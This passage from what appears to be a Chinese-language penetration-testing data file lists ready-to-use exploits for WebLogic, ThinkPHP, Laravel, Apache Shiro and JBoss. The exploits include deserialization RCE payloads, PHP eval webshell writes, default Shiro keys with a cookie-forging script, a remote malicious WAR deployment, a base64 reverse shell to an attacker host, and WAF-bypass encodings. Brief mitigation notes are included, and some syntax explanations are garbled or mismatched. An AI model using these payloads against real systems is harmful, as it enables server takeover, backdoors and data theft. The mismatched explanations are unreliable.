        command: '# XMLDecoder反序列化\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n  <soapenv:Header>\n    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">\n      <java>\n        <object class="java.lang.ProcessBuilder">\n          <array class="java.lang.String" length="3">\n            <void index="0"><string>/bin/bash</string></void>\n            <void index="1"><string>-c</string></void>\n            <void index="2"><string>id</string></void>\n          </array>\n          <void method="start"/>\n        </object>\n      </java>\n    </work:WorkContext>\n  </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>', 
        description: 'CVE-2017-10271 XMLDecoder', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'wls-wsat', explanation: 'WebLogic Web服务端点' },
          { part: 'ProcessBuilder', explanation: 'Java进程构建器' },
          { part: 'void method="start"', explanation: '调用start方法执行命令' }
        ]
      },
      { 
        title: '2. CVE-2019-2725', 
        command: '# 新版XMLDecoder绕过\nPOST /_async/AsyncResponseService HTTP/1.1\nContent-Type: text/xml\n\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing">\n  <soapenv:Header>\n    <wsa:Action>xx</wsa:Action>\n    <wsa:RelatesTo>xx</wsa:RelatesTo>\n    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">\n      <java class="java.beans.XMLDecoder">\n        <void class="java.lang.ProcessBuilder">\n          <array class="java.lang.String" length="3">\n            <void index="0"><string>/bin/bash</string></void>\n            <void index="1"><string>-c</string></void>\n            <void index="2"><string>id</string></void>\n          </array>\n          <void method="start"/>\n        </void>\n      </java>\n    </work:WorkContext>\n  </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>', 
        description: 'CVE-2019-2725 AsyncResponseService', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://schemas.xmlsoap.org/soap/envelope/', explanation: '目标URL', type: 'value' }
        ]
      },
      { 
        title: '3. CVE-2020-14882', 
        command: '# 未授权访问+命令执行\n# 登录绕过\nGET /console/css/%252e%252e%252fconsole.portal HTTP/1.1\n\n# 命令执行\nGET /console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22) HTTP/1.1', 
        description: 'CVE-2020-14882 Console RCE', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '%252e%252e', explanation: '双重URL编码的..' },
          { part: 'ShellSession', explanation: 'Coherence MVEL Shell' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '路径编码绕过', 
        command: '# 不同编码方式\n/console/css/..;/console.portal\n/console/css/%2e%2e/console.portal\n/console/css/%252e%252e/console.portal\n/console/css/..%252fconsole.portal',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 不同编码方式\n/console/css/..;/console.portal\n/console/css/%2e%2e/console.portal\n/console/css/%252e%252e/console.portal\n/console/css/..%252fconsole.portal', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '路径编码绕过', 
        platform: 'all'
      },
      { 
        title: 'XML变体', 
        command: '# 使用不同XML标签\n<void class="java.lang.Runtime" method="getRuntime">\n<void method="exec">\n<string>id</string>\n</void>\n</void>\n\n# 使用数组形式\n<array class="java.lang.String" length="1">\n<void index="0"><string>id</string></void>\n</array>',
            syntaxBreakdown: [
              { part: '# 使用不同XML标签\n<void class="java.lang.Runtime" method="getRuntime">\n<void method=', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'XML变体绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Oracle WebLogic Server是企业级Java应用服务器，其T3/IIOP反序列化、SSRF、远程代码执行等漏洞层出不穷。WebLogic漏洞通常可直接获取服务器权限，是攻击者在Java环境中的首要目标。',
      vulnerability: 'WebLogic高危漏洞：1)T3协议反序列化(CVE-2015-4852/CVE-2018-2628等) 2)XMLDecoder反序列化(CVE-2017-10271) 3)SSRF(CVE-2014-4210访问内网Redis) 4)Console未授权访问 5)IIOP反序列化等。每个季度Oracle CPU都会修复新的WebLogic漏洞。',
      exploitation: '完�利用流程：\n1. 识别WebLogic版本\n2. 检测开放端口和端点\n3. 选择合适的CVE利用\n4. 执行命令或写入WebShell',
      mitigation: '防御WebLogic漏洞：及时应用Oracle关键补丁更新(CPU)，关闭不必要的T3/IIOP协议端口，限制管理控制台的访问IP，部署Web应用防火墙，使用网络分段隔离WebLogic服务器，监控反序列化相关的异常类加载。',
      difficulty: 'advanced'
    }
  },
  {
    id: 'weblogic-t3',
    name: 'WebLogic T3协议攻击',
    description: 'WebLogic T3协议反序列化漏�',
    category: '框架漏洞',
    subCategory: 'WebLogic T3',
    tags: ['weblogic', 't3', 'deserialization', 'java'],
    prerequisites: ['WebLogic开放T3端口', '存在漏�版本'],
    execution: [
      { 
        title: '1. 探测T3服务', 
        command: '# 扫描T3端口(默认7001)\nnmap -sV -p 7001 target\n\n# T3握手\necho "t3 12.2.1" | nc target 7001\n\n# 如果返回HELO则存在T3服务', 
        description: '探测T3服务', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 't3 12.2.1', explanation: 'T3协议版本握手' }
        ]
      },
      { 
        title: '2. 使用工具攻击', 
        command: '# 使用weblogic_exploit\ngit clone https://github.com/0xn0ne/weblogicScanner\ncd weblogicScanner\npython3 weblogic.py -t target -p 7001\n\n# 使用WebLogicTool\njava -jar WebLogicTool.jar -target target:7001 -cmd "id"\n\n# 使用ysoserial\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "touch /tmp/pwned"', 
        description: '使用工具攻击', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'https://github.com/0xn0ne/weblogicScanner\ncd', explanation: '目标URL', type: 'value' }
        ]
      },
      { 
        title: '3. 构造恶意T3请求', 
        command: '# Python脚本构造T3请求\nimport socket\nimport struct\n\ndef send_t3_payload(target, port, payload):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((target, port))\n    \n    # T3握手\n    sock.send(b"t3 12.2.1\\n")\n    response = sock.recv(1024)\n    \n    # 发送恶意序列化对象\n    # 构造包含恶意对象的T3请求\n    sock.send(payload)\n    sock.close()\n\n# 使用ysoserial生成payload\n# java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin', 
        description: '构造恶意T3请求', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'Python脚本构造T3请求\nimport', explanation: '关键参数', type: 'value' },
          { part: 'socket\nimport', explanation: '关键参数', type: 'value' },
          { part: 'struct\n\ndef', explanation: '关键参数', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: 'Gadget链选择', 
        command: '# 不同Gadget链\nCommonsCollections1\nCommonsCollections2\nCommonsCollections3\nCommonsCollections4\nCommonsBeanutils1\nJdk7u21\nJre8u20\n\n# 根据目标环境选择合适的链',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 不同Gadget链\nCommonsCollections1\nCommonsCollections2\nCommonsCollections3\nCommonsCollections4\nCommonsBeanutils1\nJdk7u21\nJre8u20\n\n# 根据目标环境选择合适的链', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: 'Gadget链选择', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'WebLogic T3协议是其专有的RMI通信协议，用于集群节点间通信和JNDI查找。T3协议的反序列化漏洞允许远程攻击者发送恶意序列化对象，在WebLogic服务器上执行任意代码。',
      vulnerability: 'T3协议反序列化利用链：通过T3握手建立连接后发送包含恶意Gadget Chain的序列化数据(如Commons Collections链)。利用工具ysoserial生成payload，T3Exploit/WebLogic-T3-RCE等工具自动化利用。WebLogic的黑名单过滤可通过新Gadget绕过。',
      exploitation: '完�利用流程：\n1. 探测T3端口\n2. 确认WebLogic版本\n3. 选择合适的Gadget链\n4. 发送恶意序列化对象\n5. 执行命令',
      mitigation: '防御措施：\n1. 禁用T3协议或限制访问\n2. 应用最新补丁\n3. 使用网络防火墙\n4. 监控异常序列化请求',
      difficulty: 'advanced'
    }
  },
  {
    id: 'weblogic-iiop',
    name: 'WebLogic IIOP协议攻击',
    description: 'WebLogic IIOP协议反序列化漏�',
    category: '框架漏洞',
    subCategory: 'WebLogic IIOP',
    tags: ['weblogic', 'iiop', 'deserialization', 'corba'],
    prerequisites: ['WebLogic开放IIOP端口', '存在漏�版本'],
    execution: [
      { 
        title: '1. 探测IIOP服务', 
        command: '# 扫描IIOP端口\tnmap -sV -p 7001 target\n\n# IIOP使用相同端口\n# 检测是否支持IIOP\n# 使用工具检测',
        syntaxBreakdown: [
          { part: 'nmap -sV', explanation: '使用Nmap版本探测扫描目标端口服务', type: 'command' },
          { part: '-p 7001', explanation: 'WebLogic默认端口，IIOP和T3共用此端口', type: 'parameter' },
          { part: 'target', explanation: '目标WebLogic服务器地址', type: 'variable' }
        ], 
        description: '探测IIOP服务', 
        platform: 'all'
      },
      { 
        title: '2. CVE-2020-2551', 
        command: '# 使用weblogic_CVE_2020_2551\ngit clone https://github.com/Y4er/CVE-2020-2551\ncd CVE-2020-2551\n\n# 编译并运行\nmvn package\njava -jar target/CVE-2020-2551-1.0-SNAPSHOT.jar target 7001\n\n# 使用JRMP监听\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"',
        syntaxBreakdown: [
          { part: 'CVE-2020-2551', explanation: 'WebLogic IIOP协议反序列化RCE漏洞', type: 'command' },
          { part: 'java -jar target/CVE-2020-2551.jar', explanation: '运行编译好的漏洞利用工具', type: 'command' },
          { part: 'target 7001', explanation: '目标地址和WebLogic端口', type: 'value' },
          { part: 'JRMPListener 8888', explanation: '在攻击机启动JRMP监听接收反连', type: 'parameter' },
          { part: 'CommonsCollections1', explanation: '指定返回给目标的Gadget链类型', type: 'parameter' }
        ], 
        description: 'CVE-2020-2551利用', 
        platform: 'all'
      },
      { 
        title: '3. 构造IIOP请求', 
        command: '# 使用Python构造\n# 需要安装相关库\npip install idna\n\n# 使用JNDI注入\n# 构造恶意JNDI引用\nString jndiURL = "iiop://attacker:1099/Exploit";\nContext ctx = new InitialContext();\nctx.lookup(jndiURL);\n\n# 使用JNDIExploit工具\njava -jar JNDIExploit.jar -i attacker_ip',
        syntaxBreakdown: [
          { part: 'iiop://attacker:1099/Exploit', explanation: 'IIOP协议的JNDI查找URL', type: 'value' },
          { part: 'ctx.lookup(jndiURL)', explanation: 'JNDI查找触发远程类加载执行恶意代码', type: 'command' },
          { part: 'JNDIExploit.jar -i attacker_ip', explanation: 'JNDI利用工具，-i指定攻击机IP', type: 'command' }
        ], 
        description: '构造IIOP请求', 
        },
      ],
    wafBypass: [
      { 
        title: '协议切换', 
        command: '# 在T3和IIOP之�切换\n# 如果T3被禁用，尝试IIOP\n# 使用不同协议绕过检测',
        syntaxBreakdown: [
          { part: 'T3', explanation: 'WebLogic专有协议，常被WAF重点监控', type: 'parameter' },
          { part: 'IIOP', explanation: 'CORBA标准协议，功能类似T3但WAF检测较少', type: 'parameter' },
          { part: '协议切换', explanation: '当T3被禁用/检测时切换到IIOP绕过防护', type: 'command' }
        ], 
        description: '协议切换绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'WebLogic IIOP(Internet Inter-ORB Protocol)是CORBA标准的通信协议，也存在反序列化漏洞。当T3协议被防火墙阻断时，IIOP端口(默认7001)可作为替代的攻击入口实现RCE。',
      vulnerability: 'IIOP反序列化与T3原理类似，但使用CORBA协议封装。攻击者通过IIOP协议发送恶意序列化对象绕过T3的黑名单过滤(因为两者的反序列化路径不同)。CVE-2020-2551等漏洞通过IIOP协议实现远程代码执行。',
      exploitation: '完�利用流程：\n1. 探测IIOP端口\n2. 使用CVE-2020-2551利用工具\n3. 发送恶意序列化对象\n4. 执行命令',
      mitigation: '防御WebLogic IIOP漏洞：如不使用IIOP功能则关闭该协议监听，限制IIOP端口的网络访问(仅允许可信的集群节点)，及时应用Oracle安全补丁，部署反序列化防护中间件(如RASP)检测恶意类加载。',
      difficulty: 'advanced'
    }
  },
  {
    id: 'thinkphp-rce',
    name: 'ThinkPHP远程代码执行',
    description: 'ThinkPHP框架RCE漏�',
    category: '框架漏洞',
    subCategory: 'ThinkPHP',
    tags: ['thinkphp', 'rce', 'php', 'framework'],
    prerequisites: ['使用ThinkPHP框架', '存在漏�版本'],
    execution: [
      { 
        title: '1. ThinkPHP 5.x RCE', 
        command: '# ThinkPHP 5.0.x RCE\n# 方法调用\n?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1\n\n# 写入WebShell\n?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php eval($_POST[cmd]);?>\n\n# 执行系统命令\n?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id', 
        description: 'ThinkPHP 5.0.x RCE', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'invokefunction', explanation: '调用函数方法' },
          { part: 'call_user_func_array', explanation: 'PHP回调函数' },
          { part: 'vars[0]', explanation: '函数名参数' }
        ]
      },
      { 
        title: '2. ThinkPHP 5.1.x RCE', 
        command: '# ThinkPHP 5.1.x RCE\n?s=index/think\\Request/input&filter[]=system&data=id\n?s=index/think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id\n?s=index/think\\Template/driver/file/write&cacheFile=shell.php&content=%3C%3Fphp%20eval($_POST[cmd]);%3F%3E', 
        description: 'ThinkPHP 5.1.x RCE', 
        platform: 'all'
      },
      { 
        title: '3. ThinkPHP 5.0.23 RCE', 
        command: '# POST方法\nPOST /index.php?s=captcha HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\n_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id\n\n# 写入Shell\n_method=__construct&filter[]=file_put_contents&method=get&server[REQUEST_METHOD]=shell.php&get[]=<?php eval($_POST[cmd]);?>', 
        description: 'ThinkPHP 5.0.23 RCE', 
        platform: 'all'
      },
      { 
        title: '4. 信息收集', 
        command: '# 获取ThinkPHP版本\n# 查看响应�\nX-Powered-By: ThinkPHP 5.0.x\n\n# 访问特定页面\n/index.php?s=/index/\\think\\app/init\n/index.php?s=/index/\\think\\Request/input\n\n# 错误信息泄露\n# 触发错误查看版本', 
        description: '信息收集', 
        },
      ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '# URL编码\n?s=%2fIndex%2f%5cthink%5capp%2finvokefunction\n\n# 大小写混合\n?s=/Index/\\Think\\App/invokefunction\n\n# 双重编码\n?s=%252fIndex%252f%255cthink%255capp%252finvokefunction',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' URL编码\n?s=%2fIndex%2f%5cthink%5capp%2finvokefunction\n\n# 大小写混合\n?s=/Index/\\Think\\App/invokefunction\n\n# 双重编码\n?s=%252fIndex%252f%255cthink%255capp%252finvokefunction', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '编码绕过', 
        platform: 'all'
      },
      { 
        title: '路径变体', 
        command: '# 不同路径格式\n?s=/index/think\\app/invokefunction\n?s=index/think/app/invokefunction\n?s=/index/\\think\\App/invokefunction\n\n# 使用不同入口点\n/index.php?s=...\n/?s=...\n/public/index.php?s=...',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 不同路径格式\n?s=/index/think\\app/invokefunction\n?s=index/think/app/invokefunction\n?s=/index/\\think\\App/invokefunction\n\n# 使用不同入口点\n/index.php?s=...\n/?s=...\n/public/index.php?s=...', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '路径变体绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'ThinkPHP是中国最流行的PHP开发框架，其历史版本(3.x/5.x/6.x)存在多个远程代码执行漏洞。由于使用范围极广(中国政企/教育/电商)，ThinkPHP漏洞是批量渗透的高价值目标。',
      vulnerability: 'ThinkPHP高危漏洞：1)5.0.x路由参数RCE(通过controller/action注入调用任意方法) 2)5.1.x Request类方法覆盖RCE 3)5.x多语言模块文件包含 4)3.x缓存文件写入GetShell 5)6.x反序列化POP链。利用URL如/index.php?s=/index/think\app/invokefunction。',
      exploitation: '完�利用流程：\n1. 识别ThinkPHP版本\n2. 选择对应的利用方式\n3. 执行命令或写入Shell\n4. 获取服务器权限',
      mitigation: '防御ThinkPHP漏洞：升级到最新安全版本，关闭DEBUG模式和错误显示，配置路由严格模式禁止控制器名中的特殊字符，删除不必要的入口文件和模块，部署WAF规则检测ThinkPHP特征payload。',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'laravel-rce',
    name: 'Laravel远程代码执行',
    description: 'Laravel框架RCE漏�',
    category: '框架漏洞',
    subCategory: 'Laravel',
    tags: ['laravel', 'rce', 'php', 'framework'],
    prerequisites: ['使用Laravel框架', '存在漏�版本或配置'],
    execution: [
      { 
        title: '1. CVE-2021-3129', 
        command: '# Laravel Ignition RCE\n# 使用工具\ngit clone https://github.com/zhzyker/CVE-2021-3129\ncd CVE-2021-3129\npython3 exp.py -t http://target\n\n# 手动利用\n# 需要发送Phar反序列化payload\n# 使用phpggc生成\nphpggc Laravel/RCE1 system id > payload\n\n# 发送请求\nPOST /_ignition/health-check HTTP/1.1\nContent-Type: application/json\n\n{"solution":"...","parameters":{"viewFile":"phar://..."}}', 
        description: 'CVE-2021-3129 Ignition RCE', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '_ignition', explanation: 'Ignition调试工具端点' },
          { part: 'phar://', explanation: 'Phar协议触发反序列化' }
        ]
      },
      { 
        title: '2. 调试模式信息泄露', 
        command: '# APP_DEBUG=true信息泄露\n# 访问触发错误的页面\n# 查看堆栈跟踪中的敏感信息\n\n# 可能泄露:\n- 数据库凭证\n- API密钥\n- 环境变量\n- 服务器路径\n- 源代码片段', 
        description: '调试模式信息泄露', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'APP_DEBUG', explanation: '关键参数', type: 'value' },
          { part: 'true信息泄露\n#', explanation: '关键参数', type: 'value' },
          { part: '访问触发错误的页面\n#', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '3. .env文件泄露', 
        command: '# 尝试访问.env文件\nGET /.env HTTP/1.1\nGET /../.env HTTP/1.1\nGET /public/.env HTTP/1.1\n\n# .env文件包含:\nAPP_KEY=base64:...\nDB_HOST=localhost\nDB_DATABASE=laravel\nDB_USERNAME=root\nDB_PASSWORD=password', 
        description: '.env文件泄露', 
        platform: 'all'
      },
      { 
        title: '4. APP_KEY利用', 
        command: '# 获取APP_KEY后\n# 可以伪造Cookie\n# 解密加密数据\n\n# 使用工具解密\nphp artisan decrypt <encrypted_value>\n\n# 伪造管理员Cookie\n# 需要了解应用加密方式', 
        description: 'APP_KEY利用', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '# 获取APP_KEY后\n# 可以伪造Cookie\n# ', explanation: '利用载荷', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '路径绕过', 
        command: '# 尝试不同路径\n/.env\n/.env.example\n/.env.local\n/.env.production\n/../.env\n/..%2f.env\n/..%252f.env',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 尝试不同路径\n/.env\n/.env.example\n/.env.local\n/.env.production\n/../.env\n/..%2f.env\n/..%252f.env', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '路径绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Laravel是PHP最流行的现代框架，其RCE漏洞主要来自反序列化POP链、Debug模式信息泄露(Ignition组件)、以及不安全的配置(APP_KEY泄露导致加密Cookie伪造)。',
      vulnerability: 'Laravel漏洞：1)Ignition RCE(CVE-2021-3129,通过清除日志+phar反序列化执行代码) 2)Cookie反序列化(APP_KEY泄露后伪造加密Cookie触发POP链) 3)Debug模式泄露数据库密码/API密钥 4)Blade模板注入({!!$input!!}未转义)。',
      exploitation: '完�利用流程：\n1. 检测Laravel版本和组件\n2. 尝试.env文件泄露\n3. 利用Ignition RCE\n4. 或利用APP_KEY伪造身份',
      mitigation: '防御措施：\n1. 关闭调试模式\n2. 升级Ignition组件\n3. 保护.env文件\n4. 定期轮换APP_KEY',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'shiro-deserialize',
    name: 'Apache Shiro反序列化',
    description: 'Apache Shiro RememberMe反序列化漏�',
    category: '框架漏洞',
    subCategory: 'Apache Shiro',
    tags: ['shiro', 'deserialization', 'java', 'rememberme'],
    prerequisites: ['使用Apache Shiro', '存在漏�版本'],
    execution: [
      { 
        title: '1. 检测Shiro', 
        command: '# 检测rememberMe Cookie\n# 响应中有rememberMe=deleteMe表示使用Shiro\n\n# 使用工具检测\ngit clone https://github.com/sv3nbeast/ShiroScan\ncd ShiroScan\njava -jar shiro_scan.jar -t http://target\n\n# 或使用Burp插件\n# ShiroScan Burp插件', 
        description: '检测Shiro框架', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'rememberMe', explanation: 'Shiro记住我功能Cookie' },
          { part: 'deleteMe', explanation: 'Shiro删除Cookie标记' }
        ]
      },
      { 
        title: '2. 使用ysoserial生成payload', 
        command: '# 生成恶意序列化对象\njava -jar ysoserial.jar CommonsCollections2 "id" > payload.ser\n\n# 使用Shiro内置密钥加密\n# 默认密钥: kPH+bIxk5D2deZiIxcaaaA==\n\n# Python加密脚本\nimport base64\nfrom Crypto.Cipher import AES\n\ndef encode_rememberme(command):\n    # 生成payload\n    payload = os.popen(f"java -jar ysoserial.jar CommonsCollections2 \\"{command}\\"").read()\n    \n    # AES加密\n    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")\n    cipher = AES.new(key, AES.MODE_CBC, iv=key)\n    \n    # PKCS5Padding\n    pad = 16 - len(payload) % 16\n    payload += bytes([pad]) * pad\n    \n    encrypted = cipher.encrypt(payload)\n    return base64.b64encode(encrypted).decode()', 
        description: '生成恶意payload', 
        platform: 'all'
      },
      { 
        title: '3. 发送恶意请求', 
        command: '# 使用curl\ncurl -H "Cookie: rememberMe=<ENCODED_PAYLOAD>" http://target\n\n# 使用工具\ngit clone https://github.com/insightglacier/Shiro_exploit\ncd Shiro_exploit\npython3 shiro_exploit.py -t http://target -c "id"\n\n# 使用ShiroAttack\ngit clone https://github.com/acgbfull/ShiroAttack\ncd ShiroAttack\njava -jar ShiroAttack.jar', 
        description: '发送恶意请求', 
        platform: 'all'
      },
      { 
        title: '4. 常见密钥列表', 
        command: '# 常见Shiro密钥\nkPH+bIxk5D2deZiIxcaaaA==\n4AvVhmFLUs0KTA3Kprsdag==\nZ3VucwAAAAAAAAAAAAAAAA==\nfCq+/xW488hMTCD+cmJ3aQ==\n1QWLxg+NYmxraMoxAXu/Iw==\n25BsmdYwjnfcWmnhAciDDg==\n2AvVhdsgUs0F8SZSnWd+Zw==\n6ZmI6I2j5Y+R54aHjOqYzg==\n\n# 尝试不同密钥\n# 或爆�密钥', 
        description: '常见密钥列表', 
        },
      ],
    wafBypass: [
      { 
        title: 'Gadget链选择', 
        command: '# 不同Gadget链\nCommonsCollections2\nCommonsBeanutils1\nJdk7u21\nJRMPClient\n\n# 根据目标环境选择\n# 某些链可能被过滤',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 不同Gadget链\nCommonsCollections2\nCommonsBeanutils1\nJdk7u21\nJRMPClient\n\n# 根据目标环境选择\n# 某些链可能被过滤', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: 'Gadget链选择', 
        platform: 'all'
      },
      { 
        title: '密钥爆�', 
        command: '# 使用工具爆�密钥\ngit clone https://github.com/insightglacier/Shiro_exploit\npython3 shiro_exploit.py -t http://target -f keys.txt\n\n# 或使用ShiroScan\njava -jar shiro_scan.jar -t http://target -f keys.txt',
            syntaxBreakdown: [
              { part: '# 使用工具爆�密钥\ngit clone https://github.com/insightglacier/Shiro_exploit\npython3 s', explanation: '攻击载荷', type: 'value' }
            ],
        description: '密钥爆�', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'Apache Shiro RememberMe功能使用AES加密序列化对象，密钥硬编码导�反序列化漏�。',
      vulnerability: 'Apache Shiro RememberMe Cookie使用AES-CBC加密(默认密钥kPH+bIxk5D2deZiIxcaaaA==)。攻击流程：1)检测特征(Cookie中的rememberMe=deleteMe) 2)使用默认密钥或爆破密钥 3)用ysoserial生成Gadget Chain 4)AES加密+Base64编码后设置为Cookie值。',
      exploitation: '完�利用流程：\n1. 检测Shiro框架\n2. 获取或爆�密钥\n3. 生成恶意序列化对象\n4. AES加密后发送\n5. 触发反序列化执行命令',
      mitigation: '防御措施：\n1. �换默认密钥\n2. 升级Shiro版本\n3. 使用安全的序列化方案\n4. 监控异常Cookie',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'jboss-vuln',
    name: 'JBoss漏�利用',
    description: 'JBoss应用服务器漏�',
    category: '框架漏洞',
    subCategory: 'JBoss',
    tags: ['jboss', 'rce', 'java', 'deserialization'],
    prerequisites: ['使用JBoss服务器', '存在漏�版本'],
    execution: [
      { 
        title: '1. JMXInvokerServlet反序列化', 
        command: '# CVE-2015-7501\n# 发送恶意序列化对象\nPOST /invoker/JMXInvokerServlet HTTP/1.1\nContent-Type: application/x-java-serialized-object\n\n# 使用ysoserial生成payload\njava -jar ysoserial.jar CommonsCollections1 "id" > payload.ser\n\n# 发送\ncurl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser http://target/invoker/JMXInvokerServlet', 
        description: 'JMXInvokerServlet反序列化', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'invoker/JMXInvokerServlet', explanation: 'JBoss JMX调用端点' },
          { part: 'x-java-serialized-object', explanation: 'Java序列化对象类型' }
        ]
      },
      { 
        title: '2. JMX Console部署War包', 
        command: '# 访问JMX Console\nhttp://target/jmx-console/\n\n# 查找deploy方法\n# 找到 jboss.system:service=MainDeployer\n\n# 部署远程War包\n# 使用deploy方法，URL参数指向恶意War\nhttp://target/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.system:service=MainDeployer&methodName=deploy&argType=java.lang.String&arg=http://attacker/shell.war\n\n# 访问部署的Shell\nhttp://target/shell/cmd.jsp?cmd=id', 
        description: 'JMX Console部署War包', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'SYSTEM', explanation: '外部实体引用', type: 'keyword' },
          { part: 'http://', explanation: 'HTTP协议', type: 'technique' }
        ]
      },
      { 
        title: '3. BSHDeployer部署', 
        command: '# 使用BeanShell部署\n# 找到 jboss.scripts:service=BSHDeployer\n\n# 执行BeanShell脚本\n# 通过createScriptDeployment方法\n\n# 构造恶意脚本\nimport java.io.*;\nRuntime rt = Runtime.getRuntime();\nProcess p = rt.exec("id");\nInputStream is = p.getInputStream();\nBufferedReader reader = new BufferedReader(new InputStreamReader(is));\nString line;\nwhile((line = reader.readLine()) != null) {\n    print(line);\n}', 
        description: 'BSHDeployer部署', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '使用BeanShell部署\n#', explanation: '关键参数', type: 'value' },
          { part: '找到', explanation: '关键参数', type: 'value' },
          { part: 'jboss.scripts:service', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '4. 使用工具', 
        command: '# JexBoss\ngit clone https://github.com/joaomatosf/jexboss\ncd jexboss\npython jexboss.py -host http://target\n\n# 自动化利用\npython jexboss.py -mode file-scan -file hosts.txt', 
        description: '使用JexBoss工具', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'https://github.com/joaomatosf/jexboss\ncd', explanation: '目标URL', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '端点变体', 
        command: '# 不同端点\n/invoker/JMXInvokerServlet\n/invoker/EJBInvokerServlet\n/invoker/readonly/JMXInvokerServlet\n/jmx-console/\n/web-console/',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 不同端点\n/invoker/JMXInvokerServlet\n/invoker/EJBInvokerServlet\n/invoker/readonly/JMXInvokerServlet\n/jmx-console/\n/web-console/', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '端点变体', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'JBoss(现WildFly)是Red Hat的Java应用服务器，历史上存在大量严重漏洞：JMXInvokerServlet反序列化、JBossAS管理控制台未授权部署、EJBInvokerServlet远程调用等，是内网Java环境的高危资产。',
      vulnerability: 'JBoss高危漏洞：1)JMXInvokerServlet反序列化(CVE-2015-7501) 2)/jmx-console/未授权访问部署WAR后门 3)/invoker/JMXInvokerServlet远程方法调用 4)EJBInvokerServlet反序列化 5)JBoss Seam参数化注入(CVE-2010-1871) 6)管理控制台弱口令(admin:admin)。',
      exploitation: '完�利用流程：\n1. 扫描JBoss服务\n2. 检测开放端点\n3. 利用反序列化或部署War\n4. 获取服务器权限',
      mitigation: '防御措施：\n1. 删除不必要的端点\n2. 实施访问控制\n3. 升级JBoss版本\n4. 网络隔离',
      difficulty: 'intermediate'
    }
  },
  {
